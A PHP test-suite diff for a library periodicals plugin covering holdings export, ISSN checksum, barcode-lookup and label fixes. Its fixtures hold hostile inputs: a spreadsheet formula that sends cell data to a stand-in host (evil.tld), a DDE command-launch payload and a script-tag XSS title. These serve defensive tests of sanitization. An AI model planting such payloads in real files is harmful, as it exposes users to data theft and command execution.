@@ -21,8 +21,10 @@ declare(strict_types=1);
  *   5. NO value contains a TAB or a newline — a stray TAB would shift every
  *      later column of the row into the wrong field;
  *   6. consistenzaAnnata() produces exactly "1-8, 10-12; lac. 9", appends the
- *      non-numeric designations verbatim, and yields to a curator-written
- *      consistenza_dichiarata when present;
+ *      non-numeric designations verbatim, and APPENDS a curator-written
+ *      consistenza_dichiarata after ' · ' instead of replacing the computed
+ *      statement (canonical rule, identical to consistenzaTestata) — the
+ *      exported holdings must keep the issues really on the shelf;
  *   7. atteso / reclamato / scartato / smarrito count neither as owned nor as
  *      a gap;
  *   8. the ACNP CSV row is a single physical line with RFC 4180 quoting and
@@ -30,7 +32,23 @@ declare(strict_types=1);
  *   9. labels: the PDF is non-empty and really is a PDF, the issue's own
  *      barcode wins over the title's barcode_base, an issue without either
  *      still gets a label, and the HTML sheet escapes a title carrying
- *      `"><script>` (no executable markup reaches the page).
+ *      `"><script>` (no executable markup reaches the page);
+ *  10. spreadsheet formula injection: a value starting with '=', '+', '-' or
+ *      '@' is neutralized with a leading apostrophe in BOTH files, while the
+ *      header line stays byte-identical (its spelling is the KBART contract);
+ *  11. an ISSN that fails its mod-11 checksum is NOT emitted — formatting it
+ *      would hand the union catalogue a well-formed ISSN belonging to another
+ *      journal;
+ *  12. an issue with an empty `numero` is counted (marker "s.n."), aligning
+ *      the export with consistenzaTestata() instead of silently declaring the
+ *      annata empty;
+ *  13. a title carrying an invalid UTF-8 byte still exports its name (the /u
+ *      modifier used to blank the whole cell);
+ *  14. scan lookup: a code matching MORE THAN ONE issue answers 'ambiguous'
+ *      and resolves to the testata instead of picking a row, while ?testata=
+ *      narrows legitimately to a unique match;
+ *  15. labels: a selection belonging to another testata is reported as an
+ *      invalid selection, not as "nothing selected".
  *
  * Conventions follow tests/emeroteca-schema-140.unit.php: env parsing, socket
  * connection, check()/pass() helpers, zz_ fixtures, FK-ordered cleanup, hard
@@ -97,29 +115,58 @@ function check(bool $cond, string $desc): void
     pass($desc);
 }
 
-$supportDir = __DIR__ . '/../storage/plugins/emeroteca/src/Support';
+$pluginDir  = __DIR__ . '/../storage/plugins/emeroteca';
+$supportDir = $pluginDir . '/src/Support';
 require_once $supportDir . '/IssnHelper.php';
 require_once $supportDir . '/KbartExporter.php';
 require_once $supportDir . '/IssueLabelRenderer.php';
+// The scan-lookup and label ROUTES are exercised through the real controller
+// (sections 14-15): an ambiguous barcode is a controller decision.
+require_once $pluginDir . '/EmerotecaPlugin.php';
+require_once $pluginDir . '/src/Controllers/ExportAdminController.php';
 
+use App\Plugins\Emeroteca\Controllers\ExportAdminController;
 use App\Plugins\Emeroteca\Support\IssnHelper;
 use App\Plugins\Emeroteca\Support\IssueLabelRenderer;
 use App\Plugins\Emeroteca\Support\KbartExporter;
+use App\Support\HookManager;
+use App\Support\Hooks;
+
+// Flash helpers write to $_SESSION; in CLI initialize it explicitly.
+$_SESSION = [];
+
+// Real HookManager marked "runtime-loaded" so the DB-registered plugin hooks
+// are NOT pulled in: this suite wires only what it exercises.
+$hookManager = new HookManager($db);
+$hookManager->setPluginsLoadedRuntime();
+Hooks::init($hookManager);
 
 // ── fixtures ─────────────────────────────────────────────────────────
 $RUN = 'zz_emuexp_' . bin2hex(random_bytes(4));
 $TITLE_MAIN   = "zz_Rivista Export {$RUN}";
 $TITLE_PREV   = "zz_Rivista Precedente {$RUN}";
 $TITLE_XSS    = "zz_XSS {$RUN} \"><script>alert(1)</script>";
+// Starts with '=': Excel/LibreOffice evaluate such a cell as a formula.
+$TITLE_FORMULA = '=HYPERLINK("https://evil.tld/?d="&A2,"Apri") zz_Formula ' . $RUN;
+// Legacy ISSN with a WRONG mod-11 check digit: 1234567 checks to '9', not '8'.
+$TITLE_BADISSN = "zz_ISSN Errato {$RUN}";
 $PUBLISHER    = "zz_Editore Export {$RUN}";
 // Real, checksum-valid ISSNs (0378-5955 is the ISO 3297 textbook example).
 $ISSN  = '0378-5955';
 $EISSN = '1476-4687';
 
-$cleanup = static function () use ($db, $TITLE_MAIN, $TITLE_PREV, $TITLE_XSS, $PUBLISHER): void {
+$cleanup = static function () use (
+    $db,
+    $TITLE_MAIN,
+    $TITLE_PREV,
+    $TITLE_XSS,
+    $TITLE_FORMULA,
+    $TITLE_BADISSN,
+    $PUBLISHER
+): void {
     $titles = implode(',', array_map(
         static fn (string $t): string => "'" . $db->real_escape_string($t) . "'",
-        [$TITLE_MAIN, $TITLE_PREV, $TITLE_XSS]
+        [$TITLE_MAIN, $TITLE_PREV, $TITLE_XSS, $TITLE_FORMULA, $TITLE_BADISSN]
     ));
     @$db->query(
         "DELETE ar FROM emeroteca_articoli ar
@@ -353,16 +400,60 @@ try {
         "non-numeric designations are listed verbatim in the tail: expected '1, 13-14; lac. S1', got '{$cons1999}'"
     );
 
-    $declared = '1998: annata rilegata, completa';
+    $declared = 'annata rilegata, completa';
     $updDecl = $db->prepare('UPDATE emeroteca_annate SET consistenza_dichiarata = ? WHERE id = ?');
     check($updDecl !== false, 'declared-consistency fixture: update prepared');
     $updDecl->bind_param('si', $declared, $annata1998);
     check($updDecl->execute(), 'declared-consistency fixture: consistenza_dichiarata written');
     $updDecl->close();
+
+    // CANONICAL RULE: the declared statement is APPENDED after ' · ', it does
+    // NOT replace the computed one. Substituting it dropped every issue really
+    // owned in that annata from the file the union catalogue ingests.
+    $withDeclared = KbartExporter::consistenzaAnnata($db, $annata1998);
     check(
-        KbartExporter::consistenzaAnnata($db, $annata1998) === $declared,
-        'a curator-written consistenza_dichiarata wins over the computed statement'
+        $withDeclared === '1-8, 10-12; lac. 9 · ' . $declared,
+        "consistenza_dichiarata is APPENDED to the computed statement, separated by ' · ' (got '{$withDeclared}')"
     );
+    check(
+        str_contains($withDeclared, '1-8, 10-12') && str_contains($withDeclared, 'lac. 9'),
+        'the really-owned issues and the gaps survive a valorized consistenza_dichiarata'
+    );
+
+    // Same rule inside the export itself: the KBART notes cell must carry the
+    // owned issues AND the declared statement for that year.
+    $tsvDeclared = KbartExporter::kbart($db, $testataId);
+    $declaredCells = explode("\t", explode("\n", rtrim($tsvDeclared, "\n"))[1]);
+    $declaredNotes = $declaredCells[array_search('notes', $expectedColumns, true)];
+    check(
+        str_contains($declaredNotes, '1998: 1-8, 10-12; lac. 9 · ' . $declared),
+        'the exported notes carry BOTH the computed holdings and the declared statement (got: ' . $declaredNotes . ')'
+    );
+
+    // A declared statement with no computed holdings stands alone.
+    $declOnlyAnnata = $exec(
+        "INSERT INTO emeroteca_annate (testata_id, anno, volume, consistenza_dichiarata)
+         VALUES (?, 1997, '0', 'raccolta lacunosa non inventariata')",
+        'i',
+        [$testataId]
+    );
+    check(
+        KbartExporter::consistenzaAnnata($db, $declOnlyAnnata) === 'raccolta lacunosa non inventariata',
+        'an annata with no issues renders the declared statement alone'
+    );
+
+    // Nothing at all → the same '—' sentinel consistenzaTestata() uses.
+    $emptyAnnata = $exec(
+        "INSERT INTO emeroteca_annate (testata_id, anno, volume) VALUES (?, 1996, '0')",
+        'i',
+        [$testataId]
+    );
+    check(
+        KbartExporter::consistenzaAnnata($db, $emptyAnnata) === '—',
+        "an annata with neither holdings nor a declared statement renders the '—' sentinel"
+    );
+    @$db->query('DELETE FROM emeroteca_annate WHERE id IN (' . $declOnlyAnnata . ',' . $emptyAnnata . ')');
+
     // Restore the computed statement for the ACNP assertions below.
     $clearDecl = $db->prepare('UPDATE emeroteca_annate SET consistenza_dichiarata = NULL WHERE id = ?');
     check($clearDecl !== false, 'declared-consistency fixture: clear prepared');
@@ -480,6 +571,332 @@ try {
         IssueLabelRenderer::labelsHtml($db, []) !== '' && str_contains(IssueLabelRenderer::labelsHtml($db, []), '</html>'),
         'an empty selection still returns a well-formed (empty-state) sheet'
     );
+
+    // ── 10. Spreadsheet formula injection ─────────────────────────────
+    // RFC 4180 quoting does NOT stop Excel/LibreOffice from evaluating a cell
+    // that starts with '=', '+', '-' or '@'. Both files are opened by the
+    // operator of the union catalogue, so both must neutralize it.
+    $formulaId = $exec(
+        "INSERT INTO emeroteca_testate (titolo, tipo, luogo_pubblicazione) VALUES (?, 'rivista', ?)",
+        'ss',
+        [$TITLE_FORMULA, '@SUM(1+1)*cmd|\' /C calc\'!A0']
+    );
+    check($formulaId > 0, 'formula fixture: hostile title and place inserted');
+
+    $tsvFormula = KbartExporter::kbart($db, $formulaId);
+    $formulaLines = explode("\n", rtrim($tsvFormula, "\n"));
+    check(
+        $formulaLines[0] === implode("\t", $expectedColumns),
+        'the KBART header is NEVER prefixed: its spelling is the contract'
+    );
+    $formulaCells = explode("\t", $formulaLines[1]);
+    check(
+        str_starts_with($formulaCells[0], "'="),
+        'a KBART data cell starting with "=" is neutralized with a leading apostrophe (got: '
+            . substr($formulaCells[0], 0, 20) . ')'
+    );
+    check(
+        !str_starts_with($formulaCells[0], '='),
+        'no KBART data cell reaches the spreadsheet as a live formula'
+    );
+
+    $csvFormula = KbartExporter::acnp($db, $formulaId);
+    $csvFormulaLines = explode("\n", rtrim($csvFormula, "\n"));
+    check(
+        $csvFormulaLines[0] === implode(',', KbartExporter::ACNP_COLUMNS),
+        'the ACNP header is NEVER prefixed either'
+    );
+    // titolo is the first cell; it contains commas so RFC 4180 quotes it, and
+    // the apostrophe must sit INSIDE the quotes, before the '='.
+    check(
+        str_starts_with($csvFormulaLines[1], '"\'=') || str_starts_with($csvFormulaLines[1], "'="),
+        'an ACNP data cell starting with "=" is neutralized too (got: '
+            . substr($csvFormulaLines[1], 0, 20) . ')'
+    );
+    check(
+        str_contains($csvFormulaLines[1], ",'@SUM(1+1)") || str_contains($csvFormulaLines[1], '"\'@SUM(1+1)'),
+        'the "@" lead-in of luogo_pubblicazione is neutralized as well (got: ' . $csvFormulaLines[1] . ')'
+    );
+    check(
+        !str_contains($csvFormula, ',=HYPERLINK') && !str_contains($csvFormula, ',@SUM'),
+        'no ACNP data cell reaches the spreadsheet as a live formula'
+    );
+
+    // ── 11. ISSN checksum ─────────────────────────────────────────────
+    // "12345678" is well FORMED but its mod-11 check digit is wrong (9, not
+    // 8). Formatting it produced "1234-5678" — a real ISSN, of a DIFFERENT
+    // journal: the knowledge base would bind these holdings to someone else.
+    check(
+        IssnHelper::isValidFormat('12345678') && !IssnHelper::isValidChecksum('12345678'),
+        'fixture: "12345678" is structurally valid but fails its checksum'
+    );
+    $badIssnId = $exec(
+        "INSERT INTO emeroteca_testate (titolo, tipo, issn, e_issn) VALUES (?, 'rivista', ?, ?)",
+        'sss',
+        [$TITLE_BADISSN, '12345678', $EISSN]
+    );
+    $tsvBad = KbartExporter::kbart($db, $badIssnId);
+    $badCells = explode("\t", explode("\n", rtrim($tsvBad, "\n"))[1]);
+    $badRow = array_combine($expectedColumns, $badCells);
+    check(
+        $badRow['print_identifier'] === '',
+        "an ISSN failing its checksum is NOT emitted (got '" . $badRow['print_identifier'] . "')"
+    );
+    check(
+        !str_contains($tsvBad, '1234-5678'),
+        'the wrong ISSN never appears hyphenated as somebody else\'s identifier'
+    );
+    check(
+        $badRow['online_identifier'] === $EISSN,
+        'a VALID identifier on the same row is still emitted (no over-blocking)'
+    );
+
+    // ── 12. Unnumbered issues ─────────────────────────────────────────
+    // consistenzaTestata() counts an issue whose `numero` is '' — the export
+    // used to skip it, so an annata holding only unnumbered issues looked
+    // empty in the file the union catalogue ingests.
+    $unnumberedAnnata = $exec(
+        "INSERT INTO emeroteca_annate (testata_id, anno, volume) VALUES (?, 2003, '4')",
+        'i',
+        [$xssId]
+    );
+    $insertFascicolo($unnumberedAnnata, '', 'posseduto', null, 'INV-2003-SN', null);
+    $unnumbered = KbartExporter::consistenzaAnnata($db, $unnumberedAnnata);
+    check(
+        $unnumbered === 's.n.',
+        "an owned issue with an empty numero is counted as 's.n.', not dropped (got '{$unnumbered}')"
+    );
+    check(
+        $unnumbered !== '—' && $unnumbered !== '',
+        'an annata holding only unnumbered issues is never declared empty'
+    );
+    $tsvUnnumbered = KbartExporter::kbart($db, $xssId);
+    $unnCells = explode("\t", explode("\n", rtrim($tsvUnnumbered, "\n"))[1]);
+    $unnRow = array_combine($expectedColumns, $unnCells);
+    check(
+        str_contains($unnRow['notes'], '2003: s.n.'),
+        'the unnumbered holdings reach the exported notes (got: ' . $unnRow['notes'] . ')'
+    );
+    check(
+        $unnRow['date_last_issue_online'] === '2003',
+        'an unnumbered owned issue extends the declared coverage like any other'
+    );
+
+    // ── 13. Invalid UTF-8 must not blank a cell ───────────────────────
+    // preg_replace('/…/u') returns NULL on invalid UTF-8 and (string) null is
+    // '': one latin-1 byte in a legacy title silently emptied publication_title.
+    //
+    // A utf8mb4 column refuses the byte outright, so the fixture cannot come
+    // from the DB: the sanitizer is exercised directly. It is a pure function
+    // and this is exactly the input that used to destroy the cell — a value
+    // reaching the exporter from a hook, an import or a legacy dump.
+    $oneLine = new \ReflectionMethod(KbartExporter::class, 'oneLine');
+    $oneLine->setAccessible(true);
+    $latin1Title = "zz_Latin1 \xE8 rivista";
+    check(
+        preg_match('//u', $latin1Title) !== 1,
+        'fixture: the value really is invalid UTF-8 (this is what returned NULL)'
+    );
+    $cleaned = (string) $oneLine->invoke(null, $latin1Title);
+    check(
+        $cleaned !== '' && str_contains($cleaned, 'zz_Latin1') && str_contains($cleaned, 'rivista'),
+        'an invalid UTF-8 byte no longer blanks the whole cell (got: ' . bin2hex($cleaned) . ')'
+    );
+    check(
+        (string) $oneLine->invoke(null, "a\tb\nc") === 'a b c',
+        'the control-character collapse still works without the /u modifier'
+    );
+
+    // ── 13b. Degraded install: optional core tables ───────────────────
+    // The plugin declares it tolerates installs without `editori` /
+    // `mensole` / `scaffali` (AbstractAdminController::tableExists,
+    // PublicController::fascicolo). An unconditional JOIN there made the
+    // whole statement fail and the export answered 200 with a HEADER-ONLY
+    // file — which the operator uploads to the union catalogue as their
+    // holdings. The probe result is forced here instead of renaming core
+    // tables on the shared dev database: the cache IS the probe, so the
+    // degraded SQL branch is the one that really runs.
+    $forceProbe = static function (string $class, mysqli $handle, array $tables): void {
+        $prop = new \ReflectionProperty($class, 'tableCache');
+        $prop->setAccessible(true);
+        $cache = $prop->getValue();
+        foreach ($tables as $table => $exists) {
+            $key = spl_object_id($handle) . '|' . $table;
+            if ($exists === null) {
+                unset($cache[$key]);
+            } else {
+                $cache[$key] = $exists;
+            }
+        }
+        $prop->setValue(null, $cache);
+    };
+
+    $forceProbe(KbartExporter::class, $db, ['editori' => false]);
+    $tsvDegraded = KbartExporter::kbart($db, $testataId);
+    $degradedLines = explode("\n", rtrim($tsvDegraded, "\n"));
+    check(
+        count($degradedLines) === 2,
+        'without `editori` the KBART export still emits the holdings row, not a header-only file'
+    );
+    $degradedRow = array_combine($expectedColumns, explode("\t", $degradedLines[1]));
+    check(
+        $degradedRow['publication_title'] === $TITLE_MAIN
+        && $degradedRow['print_identifier'] === $ISSN
+        && $degradedRow['notes'] !== '',
+        'the degraded row keeps title, ISSN and holdings — only the publisher column degrades'
+    );
+    check($degradedRow['publisher_name'] === '', 'the publisher column degrades to empty');
+    $csvDegraded = KbartExporter::acnp($db, $testataId);
+    check(
+        count(explode("\n", rtrim($csvDegraded, "\n"))) === 2,
+        'the ACNP export degrades the same way instead of emptying itself'
+    );
+    $forceProbe(KbartExporter::class, $db, ['editori' => null]);
+    check(
+        str_contains(KbartExporter::kbart($db, $testataId), $PUBLISHER),
+        'with `editori` present the publisher is joined again (the probe, not a hardcoded degradation)'
+    );
+
+    $forceProbe(IssueLabelRenderer::class, $db, ['mensole' => false, 'scaffali' => false]);
+    $htmlDegraded = IssueLabelRenderer::labelsHtml($db, [$ownBarcodeIssue]);
+    check(
+        substr_count($htmlDegraded, 'class="emeroteca-label"') === 1,
+        'without `mensole`/`scaffali` the label is still produced (the shelfmark is what degrades)'
+    );
+    check(
+        str_contains($htmlDegraded, 'INV-1999-1'),
+        'the degraded label still carries the inventory number'
+    );
+    $forceProbe(IssueLabelRenderer::class, $db, ['mensole' => null, 'scaffali' => null]);
+
+    // ── 14. Scan lookup: ambiguity is never resolved by guessing ──────
+    $reqFactory = new \Slim\Psr7\Factory\ServerRequestFactory();
+    $resFactory = new \Slim\Psr7\Factory\ResponseFactory();
+    $getReq = static function (string $path, array $query) use ($reqFactory): \Psr\Http\Message\ServerRequestInterface {
+        return $reqFactory->createServerRequest('GET', $path)->withQueryParams($query);
+    };
+    $decode = static function (\Psr\Http\Message\ResponseInterface $response): array {
+        $decoded = json_decode((string) $response->getBody(), true);
+        return is_array($decoded) ? $decoded : [];
+    };
+    $exports = new ExportAdminController($db, $hookManager);
+
+    // Two issues of the SAME title share one barcode (a real-world duplicate
+    // data-entry): the Kardex must not pick one of them and offer "receive".
+    $AMB_SAME = '9771111111117';
+    $ambAnnata = $exec(
+        "INSERT INTO emeroteca_annate (testata_id, anno, volume) VALUES (?, 2001, '3')",
+        'i',
+        [$testataId]
+    );
+    $ambIssueA = $insertFascicolo($ambAnnata, '20', 'atteso', $AMB_SAME);
+    $ambIssueB = $insertFascicolo($ambAnnata, '21', 'atteso', $AMB_SAME);
+    check($ambIssueA > 0 && $ambIssueB > 0, 'ambiguity fixture: two issues share one barcode');
+
+    $payload = $decode($exports->scanLookup(
+        $getReq('/admin/periodicals/scan-lookup', ['code' => $AMB_SAME]),
+        $resFactory->createResponse()
+    ));
+    check(
+        ($payload['match'] ?? '') === 'ambiguous',
+        "a barcode matching two issues answers 'ambiguous' (got '" . ($payload['match'] ?? '') . "')"
+    );
+    check((int) ($payload['matches'] ?? 0) === 2, 'the payload reports how many issues matched');
+    check(!isset($payload['issue']), 'no issue is proposed when the code is ambiguous');
+    // NB: `?? 'x'` would swallow a legitimate null — test the key itself.
+    check(
+        array_key_exists('action', $payload) && $payload['action'] === null,
+        'no "receive" action is suggested for an ambiguous code'
+    );
+    check(
+        (int) ($payload['title']['id'] ?? 0) === $testataId,
+        'the ambiguous answer resolves to the testata the matches share'
+    );
+    check(
+        is_string($payload['message'] ?? null) && $payload['message'] !== '',
+        'the ambiguous answer explains itself to the operator'
+    );
+
+    // Scoping to the very title that holds both matches stays ambiguous:
+    // ?testata= narrows the search, it never picks a winner.
+    $payload = $decode($exports->scanLookup(
+        $getReq('/admin/periodicals/scan-lookup', ['code' => $AMB_SAME, 'testata' => (string) $testataId]),
+        $resFactory->createResponse()
+    ));
+    check(
+        ($payload['match'] ?? '') === 'ambiguous',
+        'scoping to the title that owns both matches is still ambiguous'
+    );
+
+    // Same code on two DIFFERENT titles, and no testata owns it as its EAN
+    // base: there is nothing honest to link to.
+    $AMB_CROSS = '9772222222226';
+    $crossAnnata = $exec(
+        "INSERT INTO emeroteca_annate (testata_id, anno, volume) VALUES (?, 2002, '5')",
+        'i',
+        [$xssId]
+    );
+    $insertFascicolo($ambAnnata, '30', 'atteso', $AMB_CROSS);
+    $crossIssue = $insertFascicolo($crossAnnata, '30', 'atteso', $AMB_CROSS);
+    check($crossIssue > 0, 'ambiguity fixture: the same barcode also exists under another title');
+
+    $payload = $decode($exports->scanLookup(
+        $getReq('/admin/periodicals/scan-lookup', ['code' => $AMB_CROSS]),
+        $resFactory->createResponse()
+    ));
+    check(
+        ($payload['match'] ?? '') === 'ambiguous'
+        && array_key_exists('title', $payload) && $payload['title'] === null,
+        'matches spread over several titles are ambiguous with no link to guess at'
+    );
+
+    // …but scoping to a title that holds exactly ONE of them is a legitimate
+    // narrowing and resolves uniquely.
+    $payload = $decode($exports->scanLookup(
+        $getReq('/admin/periodicals/scan-lookup', ['code' => $AMB_CROSS, 'testata' => (string) $xssId]),
+        $resFactory->createResponse()
+    ));
+    check(
+        ($payload['match'] ?? '') === 'issue' && (int) ($payload['issue']['id'] ?? 0) === $crossIssue,
+        'scoping to a title holding a single match resolves to that issue'
+    );
+
+    // A unique barcode still resolves to its issue, add-on and all.
+    $payload = $decode($exports->scanLookup(
+        $getReq('/admin/periodicals/scan-lookup', ['code' => $ownBarcode]),
+        $resFactory->createResponse()
+    ));
+    check(
+        ($payload['match'] ?? '') === 'issue' && (int) ($payload['issue']['id'] ?? 0) === $ownBarcodeIssue,
+        'a barcode matching exactly one issue still resolves to it'
+    );
+
+    // `?code[]=x` must not raise "Array to string conversion": the warning is
+    // printed BEFORE the body and breaks the caller's response.json().
+    ob_start();
+    $arrayRes = $exports->scanLookup(
+        $getReq('/admin/periodicals/scan-lookup', ['code' => ['9771111111117']]),
+        $resFactory->createResponse()
+    );
+    $stray = (string) ob_get_clean();
+    check($stray === '', 'an array `code` parameter emits no stray output before the JSON (got: ' . $stray . ')');
+    check(
+        json_decode((string) $arrayRes->getBody(), true) !== null,
+        'the response to an array `code` parameter is still parseable JSON'
+    );
+
+    // ── 15. Labels: an invalid selection is not "nothing selected" ─────
+    $postReq = $reqFactory->createServerRequest('POST', '/admin/periodicals/' . $xssId . '/issues/labels')
+        ->withParsedBody(['ids' => [(string) $ownBarcodeIssue]]);
+    unset($_SESSION['error_message'], $_SESSION['success_message']);
+    $exports->labels($postReq, $resFactory->createResponse(), ['id' => (string) $xssId]);
+    check(
+        ($_SESSION['error_message'] ?? '') !== ''
+        && ($_SESSION['error_message'] ?? '') !== 'Nessun fascicolo selezionato.',
+        'issues belonging to another testata are refused as an INVALID selection, not as an empty one (got: "'
+            . ($_SESSION['error_message'] ?? '') . '")'
+    );
+    unset($_SESSION['error_message'], $_SESSION['success_message']);
 } catch (\Throwable $e) {
     $cleanup();
     $db->close();
